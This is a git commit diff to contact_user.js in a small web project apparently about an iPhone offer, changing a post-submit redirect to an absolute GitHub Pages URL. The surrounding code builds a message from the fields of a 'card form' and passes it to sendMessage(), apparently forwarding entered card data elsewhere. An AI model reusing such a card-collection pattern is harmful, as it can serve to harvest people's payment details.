f0df945a87950a7a43ce5738b2ed60954bc57350
Sh6lok <95735865+Sh6lok@users.noreply.github.com>
2024-01-28 23:04:14 +0500

    Update contact_user.js

--- contact_user.js
+++ contact_user.js
@@ -34,7 +34,7 @@ function retretiveCardForm(event){
         txt +=  key + values[key] + "%0A";
     }
 
-    window.location.href = 'thx.html'
+    window.location.href = 'https://sh6lok.github.io/Iphone/thx.html'
     sendMessage(txt);
 
 
